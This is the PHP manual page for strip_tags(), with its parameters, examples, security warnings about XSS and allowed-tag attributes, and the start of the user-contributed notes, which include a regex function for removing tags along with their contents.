<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

     
  
  <title>PHP: strip_tags - Manual</title>

      <link rel="stylesheet" type="text/css" href="/manual/en/fonts/Fira/fira.css" media="screen">
      <link rel="stylesheet" type="text/css" href="/manual/en/fonts/Font-Awesome/css/fontello.css" media="screen">
      <link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-base.css" media="screen">
      <link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-medium.css" media="screen">
  
 <link rel="icon" type="image/svg+xml" sizes="any" href="https://www.php.net/favicon.svg?v=2">
 <link rel="icon" type="image/png" sizes="196x196" href="https://www.php.net/favicon-196x196.png?v=2">
 <link rel="icon" type="image/png" sizes="32x32" href="https://www.php.net/favicon-32x32.png?v=2">
 <link rel="icon" type="image/png" sizes="16x16" href="https://www.php.net/favicon-16x16.png?v=2">
 <link rel="shortcut icon" href="https://www.php.net/favicon.ico?v=2">

 <link rel="search" type="application/opensearchdescription+xml" href="https://www.php.net/phpnetimprovedsearch.src" title="Add PHP.net search">
 <link rel="alternate" type="application/atom+xml" href="https://www.php.net/releases/feed.php" title="PHP Release feed">
 <link rel="alternate" type="application/atom+xml" href="https://www.php.net/feed.atom" title="PHP: Hypertext Preprocessor">

 <link rel="canonical" href="https://www.php.net/manual/en/function.strip-tags.php">
 <link rel="shorturl" href="https://www.php.net/strip-tags">
 <link rel="alternate" href="https://www.php.net/strip-tags" hreflang="x-default">

 <link rel="contents" href="https://www.php.net/manual/en/index.php">
 <link rel="index" href="https://www.php.net/manual/en/ref.strings.php">
 <link rel="prev" href="https://www.php.net/manual/en/function.strcspn.php">
 <link rel="next" href="https://www.php.net/manual/en/function.stripcslashes.php">

 <link rel="alternate" href="https://www.php.net/manual/en/function.strip-tags.php" hreflang="en">
 <link rel="alternate" href="https://www.php.net/manual/de/function.strip-tags.php" hreflang="de">
 <link rel="alternate" href="https://www.php.net/manual/es/function.strip-tags.php" hreflang="es">
 <link rel="alternate" href="https://www.php.net/manual/fr/function.strip-tags.php" hreflang="fr">
 <link rel="alternate" href="https://www.php.net/manual/it/function.strip-tags.php" hreflang="it">
 <link rel="alternate" href="https://www.php.net/manual/ja/function.strip-tags.php" hreflang="ja">
 <link rel="alternate" href="https://www.php.net/manual/pt_BR/function.strip-tags.php" hreflang="pt_BR">
 <link rel="alternate" href="https://www.php.net/manual/ru/function.strip-tags.php" hreflang="ru">
 <link rel="alternate" href="https://www.php.net/manual/tr/function.strip-tags.php" hreflang="tr">
 <link rel="alternate" href="https://www.php.net/manual/uk/function.strip-tags.php" hreflang="uk">
 <link rel="alternate" href="https://www.php.net/manual/zh/function.strip-tags.php" hreflang="zh">

<link rel="stylesheet" type="text/css" href="/manual/en/fonts/Fira/fira.css" media="screen">
<link rel="stylesheet" type="text/css" href="/manual/en/fonts/Font-Awesome/css/fontello.css" media="screen">
<link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-base.css" media="screen">
<link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-medium.css" media="screen">


 

<meta name="Description" content="Strip HTML and PHP tags from a string" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@official_php" />
<meta name="twitter:title" content="PHP: strip_tags - Manual" />
<meta name="twitter:description" content="Strip HTML and PHP tags from a string" />
<meta name="twitter:creator" content="@official_php" />
<meta name="twitter:image:src" content="https://www.php.net/images/meta-image.png" />

<meta itemprop="name" content="PHP: strip_tags - Manual" />
<meta itemprop="description" content="Strip HTML and PHP tags from a string" />
<meta itemprop="image" content="https://www.php.net/images/meta-image.png" />

<meta property="og:image" content="https://www.php.net/images/meta-image.png" />
<meta property="og:description" content="Strip HTML and PHP tags from a string" />

<link href="https://fosstodon.org/@php" rel="me" />
<!-- Matomo -->
<script>
    var _paq = window._paq = window._paq || [];
    /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
    _paq.push(["setDoNotTrack", true]);
    _paq.push(["disableCookies"]);
    _paq.push(['trackPageView']);
    _paq.push(['enableLinkTracking']);
    (function() {
        var u="https://analytics.php.net/";
        _paq.push(['setTrackerUrl', u+'matomo.php']);
        _paq.push(['setSiteId', '1']);
        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
        g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
    })();
</script>
<!-- End Matomo Code -->
</head>
<body class="docs ">

<nav class="navbar navbar-fixed-top">
  <div class="navbar__inner">
    <a href="/" aria-label="PHP Home" class="navbar__brand">
      <img
        src="/images/logos/php-logo-white.svg"
        aria-hidden="true"
        width="80"
        height="40"
      >
    </a>

    <div
      id="navbar__offcanvas"
      tabindex="-1"
      class="navbar__offcanvas"
      aria-label="Menu"
    >
      <button
        id="navbar__close-button"
        class="navbar__icon-item navbar_icon-item--visually-aligned navbar__close-button"
      >
        <svg xmlns="http://www.w3.org/2000/svg" width="24" viewBox="0 0 24 24" fill="currentColor"><path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z" /></svg>
      </button>

      <ul class="navbar__nav">
                            <li class="navbar__item">
              <a
                href="/downloads.php"
                                class="navbar__link  "
              >
                                  Downloads                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/docs.php"
                aria-current="page"                class="navbar__link navbar__link--active "
              >
                                  Documentation                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/get-involved.php"
                                class="navbar__link  "
              >
                                  Get Involved                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/support.php"
                                class="navbar__link  "
              >
                                  Help                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/releases/8.4/index.php"
                                class="navbar__link  navbar__release"
              >
                                  <img src="/images/php8/logo_php8_4.svg" alt="PHP 8.4">
                              </a>
          </li>
              </ul>
    </div>

    <div class="navbar__right">
      
      <!-- Desktop default search -->
      <form
        action="/manual-lookup.php"
        class="navbar__search-form"
      >
        <label for="navbar__search-input" aria-label="Search docs">
          <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>        </label>
        <input
          type="search"
          name="pattern"
          id="navbar__search-input"
          class="navbar__search-input"
          placeholder="Search docs"
          accesskey="s"
        >
        <input type="hidden" name="scope" value="quickref">
      </form>

      <!-- Desktop encanced search -->
      <button
        id="navbar__search-button"
        class="navbar__search-button"
        hidden
      >
        <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>        Search docs
      </button>

      <!-- Mobile default items -->
      <a
        id="navbar__search-link"
        href="/lookup-form.php"
        aria-label="Search docs"
        class="navbar__icon-item navbar__search-link"
      >
        <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>      </a>
      <a
        id="navbar__menu-link"
        href="/menu.php"
        aria-label="Menu"
        class="navbar__icon-item navbar_icon-item--visually-aligned navbar_menu-link"
      >
        <svg xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="currentColor"
>
  <path d="M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z" />
</svg>      </a>

      <!-- Mobile enhanced items -->
      <button
        id="navbar__search-button-mobile"
        aria-label="Search docs"
        class="navbar__icon-item navbar__search-button-mobile"
        hidden
      >
        <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>      </button>
      <button
        id="navbar__menu-button"
        aria-label="Menu"
        class="navbar__icon-item navbar_icon-item--visually-aligned"
        hidden
      >
        <svg xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="currentColor"
>
  <path d="M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z" />
</svg>      </button>
    </div>

    <div
      id="navbar__backdrop"
      class="navbar__backdrop"
    ></div>
  </div>

  <div id="flash-message"></div>
</nav>
<div class="headsup"><a href='/index.php#2025-09-25-3'>PHP 8.5.0 RC 1 available for testing</a></div>
<nav id="trick"><div><dl>
<dt><a href='/manual/en/getting-started.php'>Getting Started</a></dt>
	<dd><a href='/manual/en/introduction.php'>Introduction</a></dd>
	<dd><a href='/manual/en/tutorial.php'>A simple tutorial</a></dd>
<dt><a href='/manual/en/langref.php'>Language Reference</a></dt>
	<dd><a href='/manual/en/language.basic-syntax.php'>Basic syntax</a></dd>
	<dd><a href='/manual/en/language.types.php'>Types</a></dd>
	<dd><a href='/manual/en/language.variables.php'>Variables</a></dd>
	<dd><a href='/manual/en/language.constants.php'>Constants</a></dd>
	<dd><a href='/manual/en/language.expressions.php'>Expressions</a></dd>
	<dd><a href='/manual/en/language.operators.php'>Operators</a></dd>
	<dd><a href='/manual/en/language.control-structures.php'>Control Structures</a></dd>
	<dd><a href='/manual/en/language.functions.php'>Functions</a></dd>
	<dd><a href='/manual/en/language.oop5.php'>Classes and Objects</a></dd>
	<dd><a href='/manual/en/language.namespaces.php'>Namespaces</a></dd>
	<dd><a href='/manual/en/language.enumerations.php'>Enumerations</a></dd>
	<dd><a href='/manual/en/language.errors.php'>Errors</a></dd>
	<dd><a href='/manual/en/language.exceptions.php'>Exceptions</a></dd>
	<dd><a href='/manual/en/language.fibers.php'>Fibers</a></dd>
	<dd><a href='/manual/en/language.generators.php'>Generators</a></dd>
	<dd><a href='/manual/en/language.attributes.php'>Attributes</a></dd>
	<dd><a href='/manual/en/language.references.php'>References Explained</a></dd>
	<dd><a href='/manual/en/reserved.variables.php'>Predefined Variables</a></dd>
	<dd><a href='/manual/en/reserved.exceptions.php'>Predefined Exceptions</a></dd>
	<dd><a href='/manual/en/reserved.interfaces.php'>Predefined Interfaces and Classes</a></dd>
	<dd><a href='/manual/en/reserved.attributes.php'>Predefined Attributes</a></dd>
	<dd><a href='/manual/en/context.php'>Context options and parameters</a></dd>
	<dd><a href='/manual/en/wrappers.php'>Supported Protocols and Wrappers</a></dd>
</dl>
<dl>
<dt><a href='/manual/en/security.php'>Security</a></dt>
	<dd><a href='/manual/en/security.intro.php'>Introduction</a></dd>
	<dd><a href='/manual/en/security.general.php'>General considerations</a></dd>
	<dd><a href='/manual/en/security.cgi-bin.php'>Installed as CGI binary</a></dd>
	<dd><a href='/manual/en/security.apache.php'>Installed as an Apache module</a></dd>
	<dd><a href='/manual/en/security.sessions.php'>Session Security</a></dd>
	<dd><a href='/manual/en/security.filesystem.php'>Filesystem Security</a></dd>
	<dd><a href='/manual/en/security.database.php'>Database Security</a></dd>
	<dd><a href='/manual/en/security.errors.php'>Error Reporting</a></dd>
	<dd><a href='/manual/en/security.variables.php'>User Submitted Data</a></dd>
	<dd><a href='/manual/en/security.hiding.php'>Hiding PHP</a></dd>
	<dd><a href='/manual/en/security.current.php'>Keeping Current</a></dd>
<dt><a href='/manual/en/features.php'>Features</a></dt>
	<dd><a href='/manual/en/features.http-auth.php'>HTTP authentication with PHP</a></dd>
	<dd><a href='/manual/en/features.cookies.php'>Cookies</a></dd>
	<dd><a href='/manual/en/features.sessions.php'>Sessions</a></dd>
	<dd><a href='/manual/en/features.file-upload.php'>Handling file uploads</a></dd>
	<dd><a href='/manual/en/features.remote-files.php'>Using remote files</a></dd>
	<dd><a href='/manual/en/features.connection-handling.php'>Connection handling</a></dd>
	<dd><a href='/manual/en/features.persistent-connections.php'>Persistent Database Connections</a></dd>
	<dd><a href='/manual/en/features.commandline.php'>Command line usage</a></dd>
	<dd><a href='/manual/en/features.gc.php'>Garbage Collection</a></dd>
	<dd><a href='/manual/en/features.dtrace.php'>DTrace Dynamic Tracing</a></dd>
</dl>
<dl>
<dt><a href='/manual/en/funcref.php'>Function Reference</a></dt>
	<dd><a href='/manual/en/refs.basic.php.php'>Affecting PHP's Behaviour</a></dd>
	<dd><a href='/manual/en/refs.utilspec.audio.php'>Audio Formats Manipulation</a></dd>
	<dd><a href='/manual/en/refs.remote.auth.php'>Authentication Services</a></dd>
	<dd><a href='/manual/en/refs.utilspec.cmdline.php'>Command Line Specific Extensions</a></dd>
	<dd><a href='/manual/en/refs.compression.php'>Compression and Archive Extensions</a></dd>
	<dd><a href='/manual/en/refs.crypto.php'>Cryptography Extensions</a></dd>
	<dd><a href='/manual/en/refs.database.php'>Database Extensions</a></dd>
	<dd><a href='/manual/en/refs.calendar.php'>Date and Time Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.fileprocess.file.php'>File System Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.international.php'>Human Language and Character Encoding Support</a></dd>
	<dd><a href='/manual/en/refs.utilspec.image.php'>Image Processing and Generation</a></dd>
	<dd><a href='/manual/en/refs.remote.mail.php'>Mail Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.math.php'>Mathematical Extensions</a></dd>
	<dd><a href='/manual/en/refs.utilspec.nontext.php'>Non-Text MIME Output</a></dd>
	<dd><a href='/manual/en/refs.fileprocess.process.php'>Process Control Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.other.php'>Other Basic Extensions</a></dd>
	<dd><a href='/manual/en/refs.remote.other.php'>Other Services</a></dd>
	<dd><a href='/manual/en/refs.search.php'>Search Engine Extensions</a></dd>
	<dd><a href='/manual/en/refs.utilspec.server.php'>Server Specific Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.session.php'>Session Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.text.php'>Text Processing</a></dd>
	<dd><a href='/manual/en/refs.basic.vartype.php'>Variable and Type Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.webservice.php'>Web Services</a></dd>
	<dd><a href='/manual/en/refs.utilspec.windows.php'>Windows Only Extensions</a></dd>
	<dd><a href='/manual/en/refs.xml.php'>XML Manipulation</a></dd>
	<dd><a href='/manual/en/refs.ui.php'>GUI Extensions</a></dd>
</dl>
<dl>
<dt>Keyboard Shortcuts</dt><dt>?</dt>
<dd>This help</dd>
<dt>j</dt>
<dd>Next menu item</dd>
<dt>k</dt>
<dd>Previous menu item</dd>
<dt>g p</dt>
<dd>Previous man page</dd>
<dt>g n</dt>
<dd>Next man page</dd>
<dt>G</dt>
<dd>Scroll to bottom</dd>
<dt>g g</dt>
<dd>Scroll to top</dd>
<dt>g h</dt>
<dd>Goto homepage</dd>
<dt>g s</dt>
<dd>Goto search<br>(current page)</dd>
<dt>/</dt>
<dd>Focus search box</dd>
</dl></div></nav>
<div id="goto">
    <div class="search">
         <div class="text"></div>
         <div class="results"><ul></ul></div>
   </div>
</div>

  <div id="breadcrumbs" class="clearfix">
    <div id="breadcrumbs-inner">
          <div class="next">
        <a href="function.stripcslashes.php">
          stripcslashes &raquo;
        </a>
      </div>
              <div class="prev">
        <a href="function.strcspn.php">
          &laquo; strcspn        </a>
      </div>
          <ul>
            <li><a href='index.php'>PHP Manual</a></li>      <li><a href='funcref.php'>Function Reference</a></li>      <li><a href='refs.basic.text.php'>Text Processing</a></li>      <li><a href='book.strings.php'>Strings</a></li>      <li><a href='ref.strings.php'>String Functions</a></li>      </ul>
    </div>
  </div>




<div id="layout" class="clearfix">
  <section id="layout-content">
  <div class="page-tools">
    <div class="change-language">
      <form action="/manual/change.php" method="get" id="changelang" name="changelang">
        <fieldset>
          <label for="changelang-langs">Change language:</label>
          <select onchange="document.changelang.submit()" name="page" id="changelang-langs">
            <option value='en/function.strip-tags.php' selected="selected">English</option>
            <option value='de/function.strip-tags.php'>German</option>
            <option value='es/function.strip-tags.php'>Spanish</option>
            <option value='fr/function.strip-tags.php'>French</option>
            <option value='it/function.strip-tags.php'>Italian</option>
            <option value='ja/function.strip-tags.php'>Japanese</option>
            <option value='pt_BR/function.strip-tags.php'>Brazilian Portuguese</option>
            <option value='ru/function.strip-tags.php'>Russian</option>
            <option value='tr/function.strip-tags.php'>Turkish</option>
            <option value='uk/function.strip-tags.php'>Ukrainian</option>
            <option value='zh/function.strip-tags.php'>Chinese (Simplified)</option>
            <option value='help-translate.php'>Other</option>
          </select>
        </fieldset>
      </form>
    </div>
  </div><div id="function.strip-tags" class="refentry">
 <div class="refnamediv">
  <h1 class="refname">strip_tags</h1>
  <p class="verinfo">(PHP 4, PHP 5, PHP 7, PHP 8)</p><p class="refpurpose"><span class="refname">strip_tags</span> &mdash; <span class="dc-title">Strip HTML and PHP tags from a string</span></p>

 </div>
 
 <div class="refsect1 description" id="refsect1-function.strip-tags-description">
  <h3 class="title">Description</h3>
  <div class="methodsynopsis dc-description">
   <span class="methodname"><strong>strip_tags</strong></span>(<span class="methodparam"><span class="type"><a href="language.types.string.php" class="type string">string</a></span> <code class="parameter">$string</code></span>, <span class="methodparam"><span class="type"><span class="type"><a href="language.types.array.php" class="type array">array</a></span>|<span class="type"><a href="language.types.string.php" class="type string">string</a></span>|<span class="type"><a href="language.types.null.php" class="type null">null</a></span></span> <code class="parameter">$allowed_tags</code><span class="initializer"> = <strong><code><a href="reserved.constants.php#constant.null">null</a></code></strong></span></span>): <span class="type"><a href="language.types.string.php" class="type string">string</a></span></div>

  <p class="para rdfs-comment">
   This function tries to return a string with all NULL bytes, HTML and PHP tags stripped
   from a given <code class="parameter">string</code>.  It uses the same tag stripping
   state machine as the <span class="function"><a href="function.fgetss.php" class="function">fgetss()</a></span> function.
  </p>
 </div>


 <div class="refsect1 parameters" id="refsect1-function.strip-tags-parameters">
  <h3 class="title">Parameters</h3>
  <p class="para">
   <dl>
    
     <dt><code class="parameter">string</code></dt>
     <dd>
      <p class="para">
       The input string.
      </p>
     </dd>
    
    
     <dt><code class="parameter">allowed_tags</code></dt>
     <dd>
      <p class="para">
       You can use the optional second parameter to specify tags which should
       not be stripped.
       These are either given as <span class="type"><a href="language.types.string.php" class="type string">string</a></span>, or as of PHP 7.4.0, as <span class="type"><a href="language.types.array.php" class="type array">array</a></span>.
       Refer to the example below regarding the format of this parameter.
      </p>
      <blockquote class="note"><p><strong class="note">Note</strong>: 
       <p class="para">
        HTML comments and PHP tags are also stripped. This is hardcoded and
        can not be changed with <code class="parameter">allowed_tags</code>.
       </p>
      </p></blockquote>
      <blockquote class="note"><p><strong class="note">Note</strong>: 
       <p class="para">
        Self-closing XHTML tags are ignored and only non-self-closing tags should be used in
        <code class="parameter">allowed_tags</code>. For example,
        to allow both <code class="literal">&lt;br&gt;</code> and
        <code class="literal">&lt;br/&gt;</code>, you should use:
       </p>
       <div class="informalexample">
        <div class="example-contents">
<div class="annotation-interactive phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br />strip_tags</span><span style="color: #007700">(</span><span style="color: #0000BB">$input</span><span style="color: #007700">, </span><span style="color: #DD0000">'&lt;br&gt;'</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
        </div>

       </div>
      </p></blockquote>
     </dd>
    
   </dl>
  </p>
 </div>


 <div class="refsect1 returnvalues" id="refsect1-function.strip-tags-returnvalues">
  <h3 class="title">Return Values</h3>
  <p class="para">
   Returns the stripped string.
  </p>
 </div>


 <div class="refsect1 changelog" id="refsect1-function.strip-tags-changelog">
  <h3 class="title">Changelog</h3>
  <p class="para">
   <table class="doctable informaltable">
    
     <thead>
      <tr>
       <th>Version</th>
       <th>Description</th>
      </tr>

     </thead>

     <tbody class="tbody">
     <tr>
      <td>8.0.0</td>
      <td>
       <code class="parameter">allowed_tags</code> is nullable now.
      </td>
     </tr>

      <tr>
       <td>7.4.0</td>
       <td>
        The <code class="parameter">allowed_tags</code> now alternatively accepts an <span class="type"><a href="language.types.array.php" class="type array">array</a></span>.
       </td>
      </tr>

     </tbody>
    
   </table>

  </p>
 </div>


 <div class="refsect1 examples" id="refsect1-function.strip-tags-examples">
  <h3 class="title">Examples</h3>
  <p class="para">
   <div class="example" id="example-5150">
    <p><strong>Example #1 <span class="function"><strong>strip_tags()</strong></span> example</strong></p>
    <div class="example-contents">
<div class="annotation-interactive phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br />$text </span><span style="color: #007700">= </span><span style="color: #DD0000">'&lt;p&gt;Test paragraph.&lt;/p&gt;&lt;!-- Comment --&gt; &lt;a href="#fragment"&gt;Other text&lt;/a&gt;'</span><span style="color: #007700">;<br />echo </span><span style="color: #0000BB">strip_tags</span><span style="color: #007700">(</span><span style="color: #0000BB">$text</span><span style="color: #007700">);<br />echo </span><span style="color: #DD0000">"\n"</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// Allow &lt;p&gt; and &lt;a&gt;<br /></span><span style="color: #007700">echo </span><span style="color: #0000BB">strip_tags</span><span style="color: #007700">(</span><span style="color: #0000BB">$text</span><span style="color: #007700">, </span><span style="color: #DD0000">'&lt;p&gt;&lt;a&gt;'</span><span style="color: #007700">);<br /><br /></span><span style="color: #FF8000">// as of PHP 7.4.0 the line above can be written as:<br />// echo strip_tags($text, ['p', 'a']);<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
    </div>

    <div class="example-contents"><p>The above example will output:</p></div>
    <div class="example-contents screen">
<div class="annotation-interactive examplescode"><pre class="examplescode">Test paragraph. Other text
&lt;p&gt;Test paragraph.&lt;/p&gt; &lt;a href=&quot;#fragment&quot;&gt;Other text&lt;/a&gt;</pre>
</div>
    </div>
   </div>
  </p>
 </div>


 <div class="refsect1 notes" id="refsect1-function.strip-tags-notes">
  <h3 class="title">Notes</h3>
  <div class="warning"><strong class="warning">Warning</strong>
   <p class="para">
    This function should not be used to try to prevent XSS attacks.
    Use more appropriate functions like <span class="function"><a href="function.htmlspecialchars.php" class="function">htmlspecialchars()</a></span>
    or other means depending on the context of the output.
   </p>
  </div>  
  <div class="warning"><strong class="warning">Warning</strong>
   <p class="para">
    Because <span class="function"><strong>strip_tags()</strong></span> does not actually validate the
    HTML, partial or broken tags can result in the removal of more
    text/data than expected.
   </p>
  </div>
  <div class="warning"><strong class="warning">Warning</strong>
   <p class="para">
    This function does not modify any attributes on the tags that you allow
    using <code class="parameter">allowed_tags</code>, including the
    <code class="literal">style</code> and <code class="literal">onmouseover</code> attributes
    that a mischievous user may abuse when posting text that will be shown
    to other users.
   </p>
  </div>
  <blockquote class="note"><p><strong class="note">Note</strong>: 
   <p class="para">
    Tag names within the input HTML that are greater than 1023 bytes in length
    will be treated as though they are invalid, regardless of the
    <code class="parameter">allowed_tags</code> parameter.
   </p>
  </p></blockquote>
 </div>


 <div class="refsect1 seealso" id="refsect1-function.strip-tags-seealso">
  <h3 class="title">See Also</h3>
  <p class="para">
   <ul class="simplelist">
    <li><span class="function"><a href="function.htmlspecialchars.php" class="function" rel="rdfs-seeAlso">htmlspecialchars()</a> - Convert special characters to HTML entities</span></li>
   </ul>
  </p>
 </div>


</div>    <div class="contribute">
      <h3 class="title">Found A Problem?</h3>
      <div>
         
      </div>
      <div class="edit-bug">
        <a href="https://github.com/php/doc-base/blob/master/README.md" title="This will take you to our contribution guidelines on GitHub" target="_blank" rel="noopener noreferrer">Learn How To Improve This Page</a>
        •
        <a href="https://github.com/php/doc-en/blob/master/reference/strings/functions/strip-tags.xml">Submit a Pull Request</a>
        •
        <a href="https://github.com/php/doc-en/issues/new?body=From%20manual%20page:%20https:%2F%2Fphp.net%2Ffunction.strip-tags%0A%0A---">Report a Bug</a>
      </div>
    </div><section id="usernotes">
 <div class="head">
  <span class="action"><a href="/manual/add-note.php?sect=function.strip-tags&amp;repo=en&amp;redirect=https://www.php.net/manual/en/function.strip-tags.php">＋<small>add a note</small></a></span>
  <h3 class="title">User Contributed Notes <span class="count">14 notes</span></h3>
 </div><div id="allnotes">
  <div class="note" id="86964">  <div class="votes">
    <div id="Vu86964">
    <a href="/manual/vote-note.php?id=86964&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd86964">
    <a href="/manual/vote-note.php?id=86964&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V86964" title="74% like this...">
    281
    </div>
  </div>
  <a href="#86964" class="name">
  <strong class="user"><em>mariusz.tarnaski at wp dot pl</em></strong></a><a class="genanchor" href="#86964"> &para;</a><div class="date" title="2008-11-12 08:05"><strong>16 years ago</strong></div>
  <div class="text" id="Hcom86964">
<div class="phpcode"><code><span class="html">Hi. I made a function that removes the HTML tags along with their contents:
<br />
<br />Function:
<br /><span class="default">&lt;?php
<br /></span><span class="keyword">function </span><span class="default">strip_tags_content</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$tags </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">, </span><span class="default">$invert </span><span class="keyword">= </span><span class="default">FALSE</span><span class="keyword">) {
<br />
<br />  </span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">'/&lt;(.+?)[\s]*\/?[\s]*&gt;/si'</span><span class="keyword">, </span><span class="default">trim</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">), </span><span class="default">$tags</span><span class="keyword">);
<br />  </span><span class="default">$tags </span><span class="keyword">= </span><span class="default">array_unique</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);
<br />    
<br />  if(</span><span class="default">is_array</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">) AND </span><span class="default">count</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">) &gt; </span><span class="default">0</span><span class="keyword">) {
<br />    if(</span><span class="default">$invert </span><span class="keyword">== </span><span class="default">FALSE</span><span class="keyword">) {
<br />      return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'@&lt;(?!(?:'</span><span class="keyword">. </span><span class="default">implode</span><span class="keyword">(</span><span class="string">'|'</span><span class="keyword">, </span><span class="default">$tags</span><span class="keyword">) .</span><span class="string">')\b)(\w+)\b.*?&gt;.*?&lt;/\1&gt;@si'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);
<br />    }
<br />    else {
<br />      return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'@&lt;('</span><span class="keyword">. </span><span class="default">implode</span><span class="keyword">(</span><span class="string">'|'</span><span class="keyword">, </span><span class="default">$tags</span><span class="keyword">) .</span><span class="string">')\b.*?&gt;.*?&lt;/\1&gt;@si'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);
<br />    }
<br />  }
<br />  elseif(</span><span class="default">$invert </span><span class="keyword">== </span><span class="default">FALSE</span><span class="keyword">) {
<br />    return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'@&lt;(\w+)\b.*?&gt;.*?&lt;/\1&gt;@si'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);
<br />  }
<br />  return </span><span class="default">$text</span><span class="keyword">;
<br />}
<br /></span><span class="default">?&gt;
<br /></span>
<br />Sample text:
<br />$text = '&lt;b&gt;sample&lt;/b&gt; text with &lt;div&gt;tags&lt;/div&gt;';
<br />
<br />Result for strip_tags($text):
<br />sample text with tags
<br />
<br />Result for strip_tags_content($text):
<br /> text with 
<br />
<br />Result for strip_tags_content($text, '&lt;b&gt;'):
<br />&lt;b&gt;sample&lt;/b&gt; text with 
<br />
<br />Result for strip_tags_content($text, '&lt;b&gt;', TRUE);
<br /> text with &lt;div&gt;tags&lt;/div&gt;
<br />
<br />I hope that someone is useful :)</span></code></div>
  </div>
 </div>
  <div class="note" id="128957">  <div class="votes">
    <div id="Vu128957">
    <a href="/manual/vote-note.php?id=128957&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd128957">
    <a href="/manual/vote-note.php?id=128957&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V128957" title="72% like this...">
    8
    </div>
  </div>
  <a href="#128957" class="name">
  <strong class="user"><em>makogon-vs at yandex dot ru</em></strong></a><a class="genanchor" href="#128957"> &para;</a><div class="date" title="2023-10-14 01:08"><strong>1 year ago</strong></div>
  <div class="text" id="Hcom128957">
